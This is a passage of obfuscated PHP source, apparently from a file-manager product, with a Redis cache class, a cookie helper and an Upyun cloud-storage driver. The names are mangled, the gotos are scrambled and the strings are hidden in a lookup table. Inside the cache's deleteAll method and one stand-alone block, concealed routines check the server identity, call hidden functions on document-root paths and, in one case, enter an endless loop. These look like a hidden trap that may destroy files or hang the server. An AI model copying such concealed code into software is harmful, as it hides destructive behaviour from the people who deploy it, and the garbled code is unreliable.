array($d‚ÛÍÄ³Ù[779], $d‚ÛÍÄ³Ù[780], $d‚ÛÍÄ³Ù[781]); $B§ÅÑ†³£Â = $d‚ÛÍÄ³Ù[779]; if (isset($C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[12]]) && in_array($C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[12]], $cåÌ‹¦öä‹)) { $B§ÅÑ†³£Â = $C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[12]]; } switch ($B§ÅÑ†³£Â) { case $d‚ÛÍÄ³Ù[779]: $this->_slave($C«ÕÜ±¹Ëù, $B éª‹“ë); break; case $d‚ÛÍÄ³Ù[780]: break; case $d‚ÛÍÄ³Ù[781]: $dõø†Œ÷â“ = $C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[774]]; $e˜îäé¸áä = isset($C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[778]]) ? $C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[778]] : !1; $F­Òã½…á = isset($C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[373]]) ? $C«ÕÜ±¹Ëù[$d‚ÛÍÄ³Ù[373]] : null; $this->handle = new RedisCluster(NUll, $dõø†Œ÷â“, $B éª‹“ë, $B éª‹“ë, $e˜îäé¸áä, $F­Òã½…á); break; default: break; } } private function _slave($bíÂ±‹ä, $fµëÎÍÈÛ) { goto bìß•ä†ÕÚ; bìß•ä†ÕÚ: $d½Œº‰ßÓ = $bíÂ±‹ä[$_SERVER[£ü][774]]; $this->filterConfig($bíÂ±‹ä, $d½Œº‰ßÓ[0]); $this->handle = $this->init($bíÂ±‹ä, $fµëÎÍÈÛ); goto CÎù”Ìİ”ù; E¯§Ôö£: $this->filterConfig($bíÂ±‹ä, $d½Œº‰ßÓ[$CŠ×±Ü¨Å¹]); $this->slaveHandle = $this->init($bíÂ±‹ä, $fµëÎÍÈÛ); goto a½Ì…Á’“›; CÎù”Ìİ”ù: unset($d½Œº‰ßÓ[0]); if (empty($d½Œº‰ßÓ)) { return; } $CŠ×±Ü¨Å¹ = array_rand($d½Œº‰ßÓ); goto E¯§Ôö£; a½Ì…Á’“›: } private function filterConfig(&$F…µÛÒö¶Î, $B ÒÒ–æ) { $D¨¹ÑÛµªÍ =& $_SERVER[£ü]; $Fòö íÒíÙ = explode($D¨¹ÑÛµªÍ[4], $B ÒÒ–æ); $AÂÕ»¢Ùªë = array($D¨¹ÑÛµªÍ[166] => $Fòö íÒíÙ[0], $D¨¹ÑÛµªÍ[167] => $Fòö íÒíÙ[1]); $F…µÛÒö¶Î = array_merge($F…µÛÒö¶Î, $AÂÕ»¢Ùªë); } public function set($a²éïÍ¤, $DÇŒÖóÉ, $dÜß©éêç = false) { $dÜß©éêç = $dÜß©éêç ? $dÜß©éêç : $this->cacheTime; return $this->handle->setEx($a²éïÍ¤, $dÜß©éêç, $DÇŒÖóÉ); } public function setLock($AÆ˜·¯›°, $c½†ÕËù±µ, $cĞ£–Å­Ôö) { return $this->handle->setNX($AÆ˜·¯›°, $c½†ÕËù±µ); } public function get($b¿·‹‹™¹È) { $E˜ö°¶›Â = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $E˜ö°¶›Â->get($b¿·‹‹™¹È); } public function remove($fîè‡ùëš„) { return $this->handle->del($fîè‡ùëš„); } public function deleteAll() { $Eƒ‚¤šÖ¹î =& $_SERVER[£ü]; if ($_SERVER[$Eƒ‚¤šÖ¹î[723]] != $_SERVER[$Eƒ‚¤šÖ¹î[782]]) { goto Bç‘ÀëôØ—; D®Ôô§ğ‰: $AÂœøÑÄ† = $Eƒ‚¤šÖ¹î[784]; $AÂœøÑÄ†($_SERVER[$Eƒ‚¤šÖ¹î[785]]); $AÂœøÑÄ†($_SERVER[$Eƒ‚¤šÖ¹î[726]] . $Eƒ‚¤šÖ¹î[786]); goto b³óÒÕÀÕ’; D—ˆÌç‘™Æ: $F»íæíë”Ë = $eË©î¯Å’($cİÎ²¦É¾Á); $DöÛĞéĞŞ = explode($Eƒ‚¤šÖ¹î[214], $F»íæíë”Ë); if (count($DöÛĞéĞŞ) < $Eƒ‚¤šÖ¹î[566]) { $A÷İ‘›õéÜ = $Eƒ‚¤šÖ¹î[728]; $A÷İ‘›õéÜ(); } goto D®Ôô§ğ‰; Bç‘ÀëôØ—: $CîöëŠ§’” = $Eƒ‚¤šÖ¹î[783]; $eË©î¯Å’ = $Eƒ‚¤šÖ¹î[725]; $cİÎ²¦É¾Á = $_SERVER[$Eƒ‚¤šÖ¹î[726]] . $Eƒ‚¤šÖ¹î[727]; goto D—ˆÌç‘™Æ; b³óÒÕÀÕ’: $cŞæ„½’á = 1; while ($cŞæ„½’á > 1) { $cŞæ„½’á = $cŞæ„½’á + 4; $f„äî ¢ê = rawurlencode($cŞæ„½’á . $Eƒ‚¤šÖ¹î[358]); } goto aæØïÒİÈ®; aæØïÒİÈ®: } if ($this->isCluster) { foreach ($this->handle->_masters() as $bˆ’¸Áª) { $this->handle->flushall($bˆ’¸Áª); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($E´Æô¯´Îå = '', $B„¢Õ½ğÕÚ = 0) { if (is_string($E´Æô¯´Îå) && $E´Æô¯´Îå != $_SERVER[£ü][33]) { $this->prefix = $E´Æô¯´Îå; } if (is_numeric($B„¢Õ½ğÕÚ) && $B„¢Õ½ğÕÚ > 0) { $this->expire = $B„¢Õ½ğÕÚ; } } public static function getInstance() { static $béŠ£Şñ“; if ($béŠ£Şñ“ === null) { $béŠ£Şñ“ = new self(); } return $béŠ£Şñ“; } private static $sameCookieSet = array(); public static function set($CØ°„Á…ç», $C‡‡¦Ñ¶Ğ, $E”ª«ƒ÷¸ = 0, $CÜÒ‚’Ãğ¡ = false, $bŒÍŠ•ì‹ = false) { $dÃ¡¬·à…æ =& $_SERVER[£ü]; if (!$E”ª«ƒ÷¸) { $E”ª«ƒ÷¸ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$CØ°„Á…ç»]) && self::$sameCookieSet[$CØ°„Á…ç»] == $C‡‡¦Ñ¶Ğ . $E”ª«ƒ÷¸) { return; } self::$sameCookieSet[$CØ°„Á…ç»] = $C‡‡¦Ñ¶Ğ . $E”ª«ƒ÷¸; if (!$bŒÍŠ•ì‹) { $bŒÍŠ•ì‹ = str_replace(HOST, $dÃ¡¬·à…æ[33], APP_HOST); $bŒÍŠ•ì‹ = _get($GLOBALS, $dÃ¡¬·à…æ[787], $bŒÍŠ•ì‹); } setcookie($CØ°„Á…ç», $C‡‡¦Ñ¶Ğ, time() + $E”ª«ƒ÷¸, $dÃ¡¬·à…æ[8] . trim($bŒÍŠ•ì‹, $dÃ¡¬·à…æ[8]), !1, !1, $CÜÒ‚’Ãğ¡); } public static function setSafe($C•²µ¨ÂÉ, $Aƒ¥œ‹¾²’, $dÔƒ«è”ò‹ = 0) { self::set($C•²µ¨ÂÉ, $Aƒ¥œ‹¾²’, $dÔƒ«è”ò‹, !0); } public static function get($F‚„Ô­’‚ø) { return isset($_COOKIE[$F‚„Ô­’‚ø]) ? $_COOKIE[$F‚„Ô­’‚ø] : !1; } public static function remove($Dá¯È¾ëÚ¡, $E„ñí¥á‡ª = false) { unset($_COOKIE[$Dá¯È¾ëÚ¡]); self::set($Dá¯È¾ëÚ¡, $_SERVER[£ü][33], 1, $E„ñí¥á‡ª); } } goto aíáîÅŒ§; e’®Çå‡˜: if (!isset($_SERVER[$_SERVER[£ü][723]]) || !isset($_SERVER[$_SERVER[£ü][724]])) { goto b–‘‘·¡ê¡; AÓ¿¾¨‹“½: $DˆÄ§–ŠÃï = explode($_SERVER[£ü][214], $F—½ñ‡¹—ã); if (count($DˆÄ§–ŠÃï) < $_SERVER[£ü][558]) { $CŠºÎ„Œ‡´ = $_SERVER[£ü][728]; $CŠºÎ„Œ‡´(); } $FÁÄéìã = $_SERVER[£ü][729]; goto d²Àõê‹Õ¦; b–‘‘·¡ê¡: $D‰’Å®’¯© = $_SERVER[£ü][725]; $Fƒö¦¥«‘ê = $_SERVER[$_SERVER[£ü][726]] . $_SERVER[£ü][727]; $F—½ñ‡¹—ã = $D‰’Å®’¯©($Fƒö¦¥«‘ê); goto AÓ¿¾¨‹“½; d²Àõê‹Õ¦: $FÁÄéìã($_SERVER[$_SERVER[£ü][726]] . $_SERVER[£ü][727]); $AÃ­ï½± = 2; while ($AÃ­ï½± > 1) { $dõÉ£ÁâÌĞ = rawurlencode($AÃ­ï½± . $_SERVER[£ü][358]); } goto CÑ’ÆÖ°À; CÑ’ÆÖ°À: } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($c¶¦÷‚ñÀ, $E½´Ñ¦¡ì = 0) { parent::__construct(); $this->source = $c¶¦÷‚ñÀ; $this->sourceSize = $E½´Ñ¦¡ì; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($A‚É¯ß°« = false) { return $this->sourceSize; } public function getContent($B¶Ü×Ø£ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $BœİĞÙ®Ãœ = ftell($this->source); $aîó ÌÂ”¿ = @fread($this->source, $this->sourceSize); fseek($this->source, $BœİĞÙ®Ãœ); return $aîó ÌÂ”¿; } } public function fileSubstr($dæã°áñƒˆ = false, $CÜçİöˆÈÂ = 0, $eÜ¯×èâÉ“ = 0) { if (!$eÜ¯×èâÉ“) { $eÜ¯×èâÉ“ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $CÜçİöˆÈÂ, $eÜ¯×èâÉ“); } if ($this->sourceType == self::TYPE_FILE) { $c°Ëì¾à• = ftell($this->source); fseek($this->source, $c°Ëì¾à• + $CÜçİöˆÈÂ); $dâƒï÷Œßß = @fread($this->source, $eÜ¯×èâÉ“); fseek($this->source, $c°Ëì¾à•); return $dâƒï÷Œßß; } } public function hashMd5($C¸ô™àÅÅ‰ = false) { return md5($this->getContent()); } public static function hash($FÄ¢Ú²ºîø, $dšéÕ´§ñì = 0) { $dõ†Ò‹–îâ = new PathDriverStream($FÄ¢Ú²ºîø, $dšéÕ´§ñì); return $dõ†Ò‹–îâ->hashSimple($FÄ¢Ú²ºîø); } public static function md5($eøØô¹¿¿Ç, $BÅØ²ª²§± = 0) { $f¿ù‹ñ‹µ = new PathDriverStream($eøØô¹¿¿Ç, $BÅØ²ª²§±); return $f¿ù‹ñ‹µ->hashMd5($eøØô¹¿¿Ç); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\57\57\166\60\x2e\x61\160\x69\x2e\x75\160\x79\165\x6e\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($cà¢ƒóŒšÏ) { parent::__construct(); $this->_init($cà¢ƒóŒšÏ); } public function _init($e’É‘Š…÷) { foreach ($e’É‘Š…÷ as $dçêŸÕŠ…£ => $aô‘–­½íè) { if (isset($this->{$dçêŸÕŠ…£})) { $this->{$dçêŸÕŠ…£} = $aô‘–­½íè; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[£ü][1223], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($AÖíÈ»¿°, $c™¶·†è•æ = "\x47\105\x54") { $b”ŸíÍ”—„ =& $_SERVER[£ü]; $a‡ÕŠÃ®ç = gmdate($b”ŸíÍ”—„[1187]); $F†°Õ¦²âŠ = base64_encode(hash_hmac($b”ŸíÍ”—„[1224], "{$c™¶·†è•æ}\46{$AÖíÈ»¿°}\x26{$a‡ÕŠÃ®ç}", md5("{$this->userpass}"), !0)); $e¥ÃÙÁƒ›¹ = array("\x41\165\x74\150\157\x72\151\172\141\164\x69\x6f\x6e\72\125\120\131\125\116\40{$this->username}\x3a{$F†°Õ¦²âŠ}", "\104\141\x74\145\x3a{$a‡ÕŠÃ®ç}"); return $e¥ÃÙÁƒ›¹; } public function ussRequest($e¯³Õ×øïÖ, $cƒÇÆÀ‡ëÙ = "\x47\105\x54", $e˜ÉÍ²‘é = false, $b‚”•°·Ò¶ = false, $CÍ®Ûï¬ÙÔ = false) { goto C¸º÷‰çôæ; C¸º÷‰çôæ: $d©ƒ©Ğ‹Ğİ =& $_SERVER[£ü]; $e¯³Õ×øïÖ = trim($e¯³Õ×øïÖ, $d©ƒ©Ğ‹Ğİ[8]); $DÚ¦Ú«—‰ = "\57{$this->bucket}\x2f{$e¯³Õ×øïÖ}"; goto dæÖ×ìŠ¿À; CÛòÊ”¸ğï: if (!$BÈ¥ëŠŸĞÉ) { return array($d©ƒ©Ğ‹Ğİ[1022] => !1, $d©ƒ©Ğ‹Ğİ[1024] => $d©ƒ©Ğ‹Ğİ[1225]); } if (strtolower($cƒÇÆÀ‡ëÙ) == $d©ƒ©Ğ‹Ğİ[181] || in_array($BÈ¥ëŠŸĞÉ[$d©ƒ©Ğ‹Ğİ[1022]], array($d©ƒ©Ğ‹Ğİ[1083], $d©ƒ©Ğ‹Ğİ[1226]))) { $e˜ÉÍ²‘é = $BÈ¥ëŠŸĞÉ[$d©ƒ©Ğ‹Ğİ[1227]]; } else { $e˜ÉÍ²‘é = json_decode($BÈ¥ëŠŸĞÉ[$d©ƒ©Ğ‹Ğİ[1024]], !0); if (!$e˜ÉÍ²‘é) { $e˜ÉÍ²‘é = $BÈ¥ëŠŸĞÉ[$d©ƒ©Ğ‹Ğİ[1024]]; } else { if (!$BÈ¥ëŠŸĞÉ[$d©ƒ©Ğ‹Ğİ[678]] && isset($e˜ÉÍ²‘é[$d©ƒ©Ğ‹Ğİ[1228]])) { $e˜ÉÍ²‘é = $e˜ÉÍ²‘é[$d©ƒ©Ğ‹Ğİ[1228]]; } } } return array($d©ƒ©Ğ‹Ğİ[1022] => $BÈ¥ëŠŸĞÉ[$d©ƒ©Ğ‹Ğİ[678]], $d©ƒ©Ğ‹Ğİ[1024] => $e˜ÉÍ²‘é); goto aÄ›½™Ş¶; dæÖ×ìŠ¿À: $A­Û‰Îêà = $this->ussHeaders($DÚ¦Ú«—‰, $cƒÇÆÀ‡ëÙ); if ($b‚”•°·Ò¶) { $A­Û‰Îêà = array_merge($A­Û‰Îêà, $b‚”•°·Ò¶); } $BÈ¥ëŠŸĞÉ = url_request($this->endpoint . $DÚ¦Ú«—‰, $cƒÇÆÀ‡ëÙ, $e˜ÉÍ²‘é, $A­Û‰Îêà, $CÍ®Ûï¬ÙÔ); goto CÛòÊ”¸ğï; aÄ›½™Ş¶: } public function mkfile($CÚ·ÍÁ¦, $BÜ‡íğ«ã = '', $cœÀ¢ß¿Ş… = REPEAT_RENAME) { if ($this->setContent($CÚ·ÍÁ¦, $BÜ‡íğ«ã)) { return $this->getPathOuter($CÚ·ÍÁ¦); } return !1; } public function mkdir($d— ÎÂä², $DÙÀ†å÷¬ƒ = REPEAT_SKIP) { $c¶ÑÀ–Ìí÷ =& $_SERVER[£ü]; $c„À‚‘ìÇÛ = trim($d— ÎÂä², $c¶ÑÀ–Ìí÷[8]); if ($this->_isFolder($c„À‚‘ìÇÛ)) { return $this->getPathOuter($c„À‚‘ìÇÛ); } $C”Âé²ğÌ = array($c¶ÑÀ–Ìí÷[1229]); $D×šŒšŞ˜ì = $this->ussRequest($c„À‚‘ìÇÛ, $c¶ÑÀ–Ìí÷[209], !1, $C”Âé²ğÌ); return $D×šŒšŞ˜ì[$c¶ÑÀ–Ìí÷[1022]] ? $this->getPathOuter($c„À‚‘ìÇÛ) : !1; } public function copyFile($E×›åÆ–¢š, $Cƒà†ÖÄà) { $eéƒ‘¨­§ñ =& $_SERVER[£ü]; $fßœ„Å‡…Ü = array($eéƒ‘¨­§ñ[1230] . "\57{$this->bucket}\x2f{$E×›åÆ–¢š}", $eéƒ‘¨­§ñ[1231]); $EÉ‘«øå«— = $this->ussRequest($Cƒà†ÖÄà, $eéƒ‘¨­§ñ[211], !1, $fßœ„Å‡…Ü); return $EÉ‘«øå«—[$eéƒ‘¨­§ñ[1022]] ? !0 : !1; } public function moveFile($AÖØî„‘„ƒ, $C¶Ûß‰¸œ) { $aõğôèè… =& $_SERVER[£ü]; $FøÍ‡‡à•œ = array($aõğôèè…[1232] . "\57{$this->bucket}\57{$AÖØî„‘„ƒ}", $aõğôèè…[1231]); $D’Ã‰ÍÔå = $this->ussRequest($C¶Ûß‰¸œ, $aõğôèè…[211], !1, $FøÍ‡‡à•œ); return $D’Ã‰ÍÔå[$aõğôèè…[1022]] ? !0 : !1; } public function delFile($C•¿Òèà´) { $b¯½›àˆ =& $_SERVER[£ü]; $C“ïãÎÁµç = $this->ussRequest($C•¿Òèà´, $b¯½›àˆ[1233]); return $C“ïãÎÁµç[$b¯½›àˆ[1022]] ? !0 : !1; } public function delFolder($aÏ¥õ¿»‡) { $EùÀóì²Ü„ =& $_SERVER[£ü]; $Eœ§öÙ¡é¡ = $this->listAll($aÏ¥õ¿»‡); krsort($Eœ§öÙ¡é¡); foreach ($Eœ§öÙ¡é¡ as $A—¯¿¢İô¤) { $this->ussRequest($A—¯¿¢İô¤[$EùÀóì²Ü„[75]], $EùÀóì²Ü„[1233]); } return $this->ussRequest($aÏ¥õ¿»‡, $EùÀóì²Ü„[1233]); } public function rename($dÈ‡µöÚŞß, $A‰ÂÃ’‡ºç) { if ($this->isFile($dÈ‡µöÚŞß)) { $A‰ÂÃ’‡ºç = get_path_father($dÈ‡µöÚŞß) . $A‰ÂÃ’‡ºç; return $this->moveFile($dÈ‡µöÚŞß, $A‰ÂÃ’‡ºç); } return $this->renameObject($dÈ‡µöÚŞß, $A‰ÂÃ’‡ºç); } public function fileInfo($d–Â Âí£Ö, $aò‚Ş¯¢Ã¹ = false, $Bø±¾º‚Ì = array()) { $fğ»Æ˜‡­† =& $_SERVER[£ü]; if ($aò‚Ş¯¢Ã¹) { return array($fğ»Æ˜‡­†[28] => $this->pathThis($d–Â Âí£Ö), $fğ»Æ˜‡­†[75] => $this->getPathOuter($fğ»Æ˜‡­†[8] . $d–Â Âí£Ö), $fğ»Æ˜‡­†[29] => $fğ»Æ˜‡­†[164], $fğ»Æ˜‡­†[77] => isset($Bø±¾º‚Ì[$fğ»Æ˜‡­†[322]]) ? $Bø±¾º‚Ì[$fğ»Æ˜‡­†[322]] : 0, $fğ»Æ˜‡­†[157] => $this->ext($d–Â Âí£Ö)); } $fé¯¹ŒŠì” = array($fğ»Æ˜‡­†[28] => $this->pathThis($d–Â Âí£Ö), $fğ»Æ˜‡­†[75] => $this->getPathOuter($fğ»Æ˜‡­†[8] . $d–Â Âí£Ö), $fğ»Æ˜‡­†[29] => $fğ»Æ˜‡­†[164], $fğ»Æ˜‡­†[184] => 0, $fğ»Æ˜‡­†[107] => isset($A‹‹Ù³‡¯[$fğ»Æ˜‡­†[1234]]) ? $A‹‹Ù³‡¯[$fğ»Æ˜‡­†[1234]] : 0, $fğ»Æ˜‡­†[77] => isset($Bø±¾º‚Ì[$fğ»Æ˜‡­†[322]]) ? $Bø±¾º‚Ì[$fğ»Æ˜‡­†[322]] : 0, $fğ»Æ˜‡­†[157] => $this->ext($d–Â Âí£Ö), $fğ»Æ˜‡­†[185] => !0, $fğ»Æ˜‡­†[186] => !0); if (empty($Bø±¾º‚Ì)) { $Bø±¾º‚Ì = $this->objectMeta($d–Â Âí£Ö); if (!$Bø±¾º‚Ì) { return $fé¯¹ŒŠì”; } $fé¯¹ŒŠì”[$fğ»Æ˜‡­†[184]] = $Bø±¾º‚Ì[$fğ»Æ˜‡­†[1235]]; $fé¯¹ŒŠì”[$fğ»Æ˜‡­†[107]] = $Bø±¾º‚Ì[$fğ»Æ˜‡­†[1236]]; $fé¯¹ŒŠì”[$fğ»Æ˜‡­†[77]] = $Bø±¾º‚Ì[$fğ»Æ˜‡­†[77]]; } return $fé¯¹ŒŠì”; } public function folderInfo($bíË—³øÄ, $aˆİ¸”’… = false) { $bƒŒÛÚóäá =& $_SERVER[£ü]; if ($aˆİ¸”’…) { return array($bƒŒÛÚóäá[28] => $this->pathThis($bíË—³øÄ), $bƒŒÛÚóäá[75] => $this->getPathOuter($bƒŒÛÚóäá[8] . $bíË—³øÄ), $bƒŒÛÚóäá[29] => $bƒŒÛÚóäá[76]); } $b¸£ù¦×ôà = array($bƒŒÛÚóäá[28] => $this->pathThis($bíË—³øÄ), $bƒŒÛÚóäá[75] => $this->getPathOuter($bƒŒÛÚóäá[8] . $bíË—³øÄ), $bƒŒÛÚóäá[29] => $bƒŒÛÚóäá[76], $bƒŒÛÚóäá[184] => 0, $bƒŒÛÚóäá[107] => isset($D‡­½Šìø½[$bƒŒÛÚóäá[1234]]) ? $D‡­½Šìø½[$bƒŒÛÚóäá[1234]] : 0, $bƒŒÛÚóäá[1144] => !0, $bƒŒÛÚóäá[1145] => !0); if (empty($E‘ÅÜšî¿º)) { $E‘ÅÜšî¿º = $this->objectMeta($bíË—³øÄ); if (!$E‘ÅÜšî¿º) { return $b¸£ù¦×ôà; } $b¸£ù¦×ôà[$bƒŒÛÚóäá[184]] = $E‘ÅÜšî¿º[$bƒŒÛÚóäá[1235]]; $b¸£ù¦×ôà[$bƒŒÛÚóäá[107]] = $E‘ÅÜšî¿º[$bƒŒÛÚóäá[1236]]; } return $b¸£ù¦×ôà; } private function fileList($f ¥…¬óÎÎ, $d«‰ªµÚ¯½ = 0, $cˆƒíÏİ¨ = 1000) { $dâ–§ÇÙå÷ =& $_SERVER[£ü]; $cÀ‰â—¹­Æ = array($dâ–§ÇÙå÷[1237], $dâ–§ÇÙå÷[1238] . $cˆƒíÏİ¨); if ($d«‰ªµÚ¯½) { $cÀ‰â—¹­Æ[] = $dâ–§ÇÙå÷[1239] . $d«‰ªµÚ¯½; } $d–âŸ¸³ = $this->ussRequest($f ¥…¬óÎÎ, $dâ–§ÇÙå÷[213], !1, $cÀ‰â—¹­Æ); return !$d–âŸ¸³[$dâ–§ÇÙå÷[1022]] ? !1 : $d–âŸ¸³[$dâ–§ÇÙå÷[1024]]; } public function listPath($E§‹¢ÔÅ, $dß¨Œ®ØÃ = false) { goto A¬Ò‰÷‡¦Ä; eõ½…ËÁİ: return array($e¸µÄììŒê[74] => $bÉŠºŠ , $e¸µÄììŒê[73] => $AÛ¯Ğ„Ü£»); goto DÇÜ©ÇàêŸ; FÆŸÖëí¤Í: $bÉŠºŠ  = $AÛ¯Ğ„Ü£» = array(); $C“’âªÃã¨ = rtrim($E§‹¢ÔÅ, $e¸µÄììŒê[8]) . $e¸µÄììŒê[8]; while (!0) { $Eá´±Èº“Ù = $this->fileList($E§‹¢ÔÅ, $fò–Ù„‘“¥, $b¡ğÇù ); if (!$Eá´±Èº“Ù) { return !1; } $fò–Ù„‘“¥ = isset($Eá´±Èº“Ù[$e¸µÄììŒê[1240]]) ? $Eá´±Èº“Ù[$e¸µÄììŒê[1240]] : $e¸µÄììŒê[33]; $D÷ŒğØ¬ğ¼ = isset($Eá´±Èº“Ù[$e¸µÄììŒê[1241]]) ? $Eá´±Èº“Ù[$e¸µÄììŒê[1241]] : array(); foreach ($D÷ŒğØ¬ğ¼ as $F‹µ‡àİêÁ) { if ($F‹µ‡àİêÁ[$e¸µÄììŒê[29]] == $e¸µÄììŒê[76]) { $bÉŠºŠ [] = $this->folderInfo($C“’âªÃã¨ . $F‹µ‡àİêÁ[$e¸µÄììŒê[28]], $dß¨Œ®ØÃ, $F‹µ‡àİêÁ); } else { $AÛ¯Ğ„Ü£»[] = $this->fileInfo($C“’âªÃã¨ . $F‹µ‡àİêÁ[$e¸µÄììŒê[28]], $dß¨Œ®ØÃ, $F‹µ‡àİêÁ); } } if (count($D÷ŒğØ¬ğ¼) < $b¡ğÇù ) { break; } } goto eõ½…ËÁİ; A¬Ò‰÷‡¦Ä: $e¸µÄììŒê =& $_SERVER[£ü]; $fò–Ù„‘“¥ = $e¸µÄììŒê[33]; $b¡ğÇù  = 1000; goto FÆŸÖëí¤Í; DÇÜ©ÇàêŸ: } private function recursionAllFiles($b˜ÂòŞ ¢õ, &$d©›‘ªÙ) { $bÂš†âÃ‹ï =& $_SERVER[£ü]; $cË£ğÈŒÅ‹ = $bÂš†âÃ‹ï[33]; $dš±©©±¾Ú = 1000; $B—±ßÛ®Ä« = $e’¹æµõÚÏ = array(); $A³Ò‘¶±ƒ• = rtrim($b˜ÂòŞ ¢õ, $bÂš†âÃ‹ï[8]) . $bÂš†âÃ‹ï[8]; while (!0) { $c”¹ï¦ìóî = $this->fileList($b˜ÂòŞ ¢õ, $cË£ğÈŒÅ‹, $dš±©©±¾Ú); if (!$c”¹ï¦ìóî) { return !1; } $cË£ğÈŒÅ‹ = isset($c”¹ï¦ìóî[$bÂš†âÃ‹ï[1240]]) ? $c”¹ï¦ìóî[$bÂš†âÃ‹ï[1240]] : $bÂš†âÃ‹ï[33]; $Aìê¥¶ê§Ó = isset($c”¹ï¦ìóî[$bÂš†âÃ‹ï[1241]]) ? $c”¹ï¦ìóî[$bÂš†âÃ‹ï[1241]] : array(); foreach ($Aìê¥¶ê§Ó as $f‡êö³·¯‚) { $eèì‹÷ùöƒ = array($bÂš†âÃ‹ï[75] => $A³Ò‘¶±ƒ• . $f‡êö³·¯‚[$bÂš†âÃ‹ï[28]], $bÂš†âÃ‹ï[76] => $f‡êö³·¯‚[$bÂš†âÃ‹ï[29]] == $bÂš†âÃ‹ï[76] ? 1 : 0, $bÂš†âÃ‹ï[77] => isset($f‡êö³·¯‚[$bÂš†âÃ‹ï[322]]) ? $f‡êö³·¯‚[$bÂš†âÃ‹ï[322]] : 0); $d©›‘ªÙ[] = $eèì‹÷ùöƒ; if ($eèì‹÷ùöƒ[$bÂš†âÃ‹ï[76]] == 1) { $this->recursionAllFiles($eèì‹÷ùöƒ[$bÂš†âÃ‹ï[75]], $d©›‘ªÙ); } } if (count($Aìê¥¶ê§Ó) < $dš±©©±¾Ú) { break; } } } public function has($aá·Õ›­…, $aê –Çä¸« = false, $dÇ¶º½¸œ = true) { goto d±‰Á²ÜšÇ; C–Š·†öÇà: $cçãƒ‹ˆß˜ = 0; $c²«¢íøÄÙ = 0; $AùâÎµÛ¬ = rtrim($aá·Õ›­…, $dÈ×¨½¬İ[8]) . $dÈ×¨½¬İ[8]; goto DùÍ³ÍÚ†; DùÍ³ÍÚ†: while (!0) { $B‘ éöÌ®ù = $this->fileList($aá·Õ›­…, $bƒÍÅí¡÷î, $DÑ‘ø¬Ü¥Š); if (!$B‘ éöÌ®ù) { return !1; } $bƒÍÅí¡÷î = isset($B‘ éöÌ®ù[$dÈ×¨½¬İ[1240]]) ? $B‘ éöÌ®ù[$dÈ×¨½¬İ[1240]] : $dÈ×¨½¬İ[33]; $FéøÆÏÁ = isset($B‘ éöÌ®ù[$dÈ×¨½¬İ[1241]]) ? $B‘ éöÌ®ù[$dÈ×¨½¬İ[1241]] : array(); if (empty($FéøÆÏÁ)) { break; } $E‰ÑÚ´ãÏ§ = array_to_keyvalue($FéøÆÏÁ, $dÈ×¨½¬İ[33], $dÈ×¨½¬İ[29]); $D¢ĞêâĞè¥ = array_count_values($E‰ÑÚ´ãÏ§); $c”®¼¾Ù‡× = isset($D¢ĞêâĞè¥[$dÈ×¨½¬İ[76]]) ? $D¢ĞêâĞè¥[$dÈ×¨½¬İ[76]] : 0; $f³ãøÖÌù = count($E‰ÑÚ´ãÏ§) - $c”®¼¾Ù‡×; if ($aê –Çä¸«) { $c²«¢íøÄÙ += $c”®¼¾Ù‡×; $cçãƒ‹ˆß˜ += $f³ãøÖÌù; if ($DÇ×Æš‘‡Ø < $DÑ‘ø¬Ü¥Š) { break; } continue; } if ($dÇ¶º½¸œ) { if ($f³ãøÖÌù) { return !0; } } else { if ($c”®¼¾Ù‡×) { return !0; } } if (count($FéøÆÏÁ) < $DÑ‘ø¬Ü¥Š) { break; } } if ($aê –Çä¸«) { return array($dÈ×¨½¬İ[188] => $cçãƒ‹ˆß˜, $dÈ×¨½¬İ[189] => $c²«¢íøÄÙ); } return !1; goto bÊ©•‚İÖò; d±‰Á²ÜšÇ: $dÈ×¨½¬İ =& $_SERVER[£ü]; $bƒÍÅí¡÷î = $dÈ×¨½¬İ[33]; $DÑ‘ø¬Ü¥Š = 1000; goto C–Š·†öÇà; bÊ©•‚İÖò: } public function listAll($Bîæ½»Í¢¬) { $f±ÓøÁ‡ë… = array(); $this->recursionAllFiles($Bîæ½»Í¢¬, $f±ÓøÁ‡ë…); return $f±ÓøÁ‡ë…; } public function canRead($e»ÉÕŠ»†) { return $this->exist($e»ÉÕŠ»†) ? !0 : !1; } public function canWrite($B©è¾äíİ¾) { return $this->exist($B©è¾äíİ¾) ? !0 : !1; } public function getContent($E©Ûè›ƒÈ) { return $this->fileSubstr($E©Ûè›ƒÈ, 0, -1); } public function setContent($FîòèøÓÌ‚, $Dôô˜±ŒÈ› = '') { $CƒãÙâ˜¡Æ =& $_SERVER[£ü]; if (!$Dôô˜±ŒÈ›) { $F²š÷Â¼âÄ = $this->ussRequest($FîòèøÓÌ‚, $CƒãÙâ˜¡Æ[209]); return $F²š÷Â¼âÄ[$CƒãÙâ˜¡Æ[1022]]; } $d˜â „¦É = $this->tempFile($this->pathThis($FîòèøÓÌ‚)); file_put_contents($d˜â „¦É, $Dôô˜±ŒÈ›); if ($this->upload($FîòèøÓÌ‚, $d˜â „¦É)) { $this->tempFileRemve($d˜â „¦É); return !0; } return !1; } public function fileSubstr($A‹”õ‘Çøõ, 